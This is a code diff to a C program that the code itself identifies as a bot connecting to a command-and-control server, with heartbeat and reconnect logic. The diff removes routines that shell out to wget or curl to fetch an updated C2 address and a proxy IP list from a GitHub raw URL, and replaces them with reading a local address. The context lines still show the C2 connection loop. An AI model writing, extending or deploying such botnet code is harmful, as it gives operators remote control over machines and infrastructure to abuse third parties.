@@ -49,8 +49,6 @@ static long ssl_set_host_name(SSL *ssl, const char *name) {
 }
 
 #define DEFAULT_ADDRESS "localhost:8080"
-#define ADDR_SOURCE "https://github.com/malasahjagotwin/cgo/raw/refs/heads/main/abots/address.txt"
-#define IPS_SOURCE "https://github.com/malasahjagotwin/cgo/raw/refs/heads/main/abots/c/proxy/ips.txt"
 #define BEAT_INTERVAL 15
 #define RETRY_USLEEP 500
 #define LINE_MAX 4096
@@ -123,14 +121,6 @@ static const char *read_address(void) {
 	return DEFAULT_ADDRESS;
 }
 
-static int fetch_to_file(const char *url, const char *dest) {
-	char cmd[1400];
-	snprintf(cmd, sizeof cmd,
-		 "wget -qO %s --timeout=5 %s 2>/dev/null || curl -fsS --max-time 5 -o %s %s 2>/dev/null",
-		 dest, url, dest, url);
-	return system(cmd) == 0;
-}
-
 static int slurp(const char *path, char *buf, size_t bufsz) {
 	FILE *fp = fopen(path, "r");
 	if (!fp) {
@@ -144,34 +134,6 @@ static int slurp(const char *path, char *buf, size_t bufsz) {
 	buf[n] = '\0';
 	fclose(fp);
 	return (int)n;
-}
-
-static void sync_proxies(void) {
-	char tmp[300] = "/tmp/ipstmp";
-	char after[8192] = {0};
-	if (!fetch_to_file(IPS_SOURCE, tmp)) {
-		remove(tmp);
-		return;
-	}
-	if (!slurp(tmp, after, sizeof after)) {
-		remove(tmp);
-		return;
-	}
-	remove(tmp);
-	if (after[0] == '\0') {
-		return;
-	}
-	const char *files[] = {"abots/c/proxy/ips.txt", "proxy/ips.txt", "ips.txt"};
-	for (size_t i = 0; i < sizeof files / sizeof files[0]; i++) {
-		FILE *fp = fopen(files[i], "w");
-		if (fp) {
-			fputs(after, fp);
-			fclose(fp);
-			printf("[bot] proxies updated\n");
-			fflush(stdout);
-			return;
-		}
-	}
 }
 
 static void base64_encode(const char *in, size_t len, char *out) {
@@ -676,24 +638,13 @@ int main(int argc, char **argv) {
 	for (;;) {
 		if (difftime(time(NULL), last_sync) > SYNC_INTERVAL) {
 			last_sync = time(NULL);
-			char newaddr[256];
-			if (fetch_to_file(ADDR_SOURCE, "/tmp/cnc_addr")) {
-				FILE *fp = fopen("/tmp/cnc_addr", "r");
-				if (fp && fgets(newaddr, sizeof newaddr, fp)) {
-					fclose(fp);
-					newaddr[strcspn(newaddr, "\r\n")] = '\0';
-					if (newaddr[0] != '\0' && strcmp(newaddr, addr) != 0) {
-						printf("[bot] address updated to %s\n", newaddr);
-						fflush(stdout);
-						strncpy(addr, newaddr, sizeof addr - 1);
-						addr[sizeof addr - 1] = '\0';
-					}
-				} else if (fp) {
-					fclose(fp);
-				}
-				remove("/tmp/cnc_addr");
+			const char *cur = read_address();
+			if (strcmp(cur, addr) != 0) {
+				printf("[bot] address updated to %s\n", cur);
+				fflush(stdout);
+				strncpy(addr, cur, sizeof addr - 1);
+				addr[sizeof addr - 1] = '\0';
 			}
-			sync_proxies();
 		}
 		int fd = connect_c2(addr);
 		if (fd < 0) {
